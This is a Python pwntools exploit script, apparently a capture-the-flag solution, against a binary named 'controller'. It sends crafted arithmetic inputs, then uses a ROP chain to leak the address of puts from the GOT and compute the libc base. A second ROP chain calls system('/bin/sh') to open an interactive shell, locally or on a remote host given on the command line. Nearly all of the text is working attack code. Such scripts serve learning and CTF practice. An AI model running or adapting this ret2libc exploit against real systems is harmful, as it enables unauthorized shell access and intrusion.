from pwn import *
import warnings
from time import sleep

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './controller'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Remove all those byte warning
warnings.filterwarnings("ignore", category=BytesWarning)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

libc = elf.libc

# Start program
io = start()

# Define the math function
def send_math():
    num1 = '-18'
    num2 = '11'
    option = '3'
    io.recvuntil('Insert the amount of 2 different types of recources:')
    io.sendline(f"{num1} {num2}")
    io.recvuntil('Choose operation:')
    io.sendlineafter(b'>', option)


send_math()

offset = 40
pop_rdi = 0x00000000004011d3 # pop rdi; ret; 
ret = 0x0000000000400606 # ret; 

# Build payload for printf libc leak address
payload = flat({
    offset: [
        pop_rdi,
        elf.got['puts'],
        elf.plt['puts'],
        elf.symbols['main']
    ]
})

io.sendline(payload)

# Recieve the puts leak address
result = io.recvuntil(b'Control Room')
split = result.split(b'\n')
leak = split[4]
puts_libc = u64(leak + b'\x00\x00')
info("Puts leaked address %#x", puts_libc)

# Update libc address
libc.address = puts_libc - libc.symbols['puts']
info("Libc address %#x", libc.address)

sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
info("Libc system address %#x", system )
info("Libc /bin/sh address %#x", sh)

payload = flat([
    b'A' * offset,
    pop_rdi,
    sh,
    ret,
    system
])

# Send the payload
send_math()
time.sleep(4)
io.sendline(payload)

io.interactive()
